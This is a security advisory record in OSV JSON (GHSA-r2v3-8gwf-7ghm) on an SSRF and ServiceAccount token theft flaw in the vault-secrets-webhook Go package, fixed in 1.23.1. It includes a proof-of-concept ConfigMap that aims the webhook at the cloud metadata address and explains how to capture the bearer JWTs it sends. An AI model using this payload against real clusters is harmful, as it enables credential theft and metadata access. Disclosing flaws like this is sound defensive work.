@@ -1,0 +1,54 @@
+{
+  "id": "GHSA-r2v3-8gwf-7ghm",
+  "modified": "2026-07-31T18:00:19.157033706Z",
+  "published": "2026-07-31T17:45:02Z",
+  "aliases": [
+    "CVE-2026-54725"
+  ],
+  "summary": "vault-addr annotation SSRF -- webhook makes outbound HTTP call to attacker URL during admission; vault-serviceaccount enables cluster-wide SA token theft via TokenRequest API",
+  "details": "## Summary\n\nThe vault-secrets-webhook reads the `vault.security.banzaicloud.io/vault-addr` annotation from any ConfigMap or Secret being admitted and uses it as the Vault server address without any validation or allowlist. When a ConfigMap or Secret contains a value prefixed with `vault:`, the webhook's admission handler synchronously calls the Vault API at the attacker-supplied address from inside the webhook process during the admission review. The webhook additionally grants `serviceaccounts/token:create` cluster-wide, and the `vault-serviceaccount` annotation controls which ServiceAccount's JWT is fetched and sent to that address. An attacker who can create ConfigMaps or Secrets in a watched namespace can cause the webhook process to make arbitrary outbound HTTP connections and exfiltrate ServiceAccount JWTs.\n\n## Details\n\n`parseVaultConfig()` at `pkg/webhook/config.go:102-107` reads `VaultAddrAnnotation` unconditionally into `vaultConfig.Addr`:\n\n```go\nif value, ok := annotations[common.VaultAddrAnnotation]; ok {\n    vaultConfig.Addr = value\n}\n```\n\nNo URL scheme validation, no hostname allowlist, no RFC-1918 or link-local filter.\n\n`MutateConfigMap` and `MutateSecret` at `pkg/webhook/configmap.go` and `pkg/webhook/secret.go` call `mw.newVaultClient(ctx, vaultConfig)` when the object contains at least one `vault:...` value. Inside `newVaultClient`, at `pkg/webhook/webhook.go:285`:\n\n```go\nclientConfig.Address = vaultConfig.Addr\n```\n\n`vault.NewClientFromConfigWithContext` then opens an HTTP connection to the attacker-controlled address from the webhook server process, synchronously during the admission review. This is not deferred to a separate pod.\n\nThe `vault-skip-verify` annotation (`pkg/webhook/config.go:197`) sets `InsecureSkipVerify: true` on the TLS config, eliminating the need for a valid certificate on the attacker's server.\n\nWhen `VaultServiceaccountAnnotation` is also set, at `pkg/webhook/webhook.go`:\n\n```go\nmw.k8sClient.CoreV1().ServiceAccounts(vaultConfig.ObjectNamespace).CreateToken(\n    ctx, saName, \u0026tokenRequest, metav1.CreateOptions{})\n```\n\nThe webhook's ClusterRole (`deploy/charts/vault-secrets-webhook/templates/webhook-rbac.yaml`) grants `serviceaccounts/token:create` cluster-wide. The resulting JWT is then POSTed to `vaultConfig.Addr/v1/auth/\u003cpath\u003e/login`. An attacker intercepts this JWT and replays it against the real Vault to access secrets bound to that ServiceAccount's Vault role.\n\n## Proof of Concept\n\nCreate a ConfigMap in any watched namespace:\n\n```yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: ssrf-poc\n  namespace: tenant-ns\n  annotations:\n    vault.security.banzaicloud.io/vault-addr: \"http://169.254.169.254/latest/meta-data/\"\n    vault.security.banzaicloud.io/vault-skip-verify: \"true\"\n    vault.security.banzaicloud.io/vault-serviceaccount: \"high-priv-sa\"\ndata:\n  secret-key: \"vault:secret/data/test#value\"\n```\n\nWhen this ConfigMap is created, the vault-secrets-webhook admission handler:\n1. Parses the annotations and reads `vault-addr: http://169.254.169.254/latest/meta-data/`\n2. Calls `CoreV1().ServiceAccounts(tenant-ns).CreateToken(ctx, \"high-priv-sa\", ...)` using cluster-wide `serviceaccounts/token:create`\n3. Calls `vault.NewClientFromConfigWithContext` which POSTs the JWT to `http://169.254.169.254/latest/meta-data/v1/auth/kubernetes/login`\n4. On AWS EKS with IMDSv1, the cloud metadata service receives the request from the webhook pod's IAM identity\n\nFor the SA token theft path: run an HTTP server at the attacker-controlled `vault-addr` to capture the `Authorization: Bearer \u003cJWT\u003e` header from the login POST.\n\n## Impact\n\nA user with `create` or `update` on ConfigMaps or Secrets in any namespace watched by the vault-secrets-webhook can:\n1. Cause the webhook process (a cluster-wide privileged component) to make arbitrary outbound HTTP connections to any address including cloud IMDS\n2. Exfiltrate ServiceAccount JWTs for any SA in their namespace, which can be replayed against the real Vault server to read secrets the SA's role is authorized to access\n\nThe attack happens at admission time in the webhook server process, not in a user pod, and requires no special privileges beyond ConfigMap or Secret create/update rights.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/bank-vaults/vault-secrets-webhook",
+        "purl": "pkg:golang/github.com/bank-vaults/vault-secrets-webhook"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.23.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.22.2",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-r2v3-8gwf-7ghm/GHSA-r2v3-8gwf-7ghm.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/bank-vaults/vault-secrets-webhook/security/advisories/GHSA-r2v3-8gwf-7ghm"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/bank-vaults/vault-secrets-webhook/commit/76db45976fee0f54cafd94dffa425e6b542f65a0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/bank-vaults/vault-secrets-webhook"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/bank-vaults/vault-secrets-webhook/releases/tag/v1.23.1"
+    }
+  ]
+}
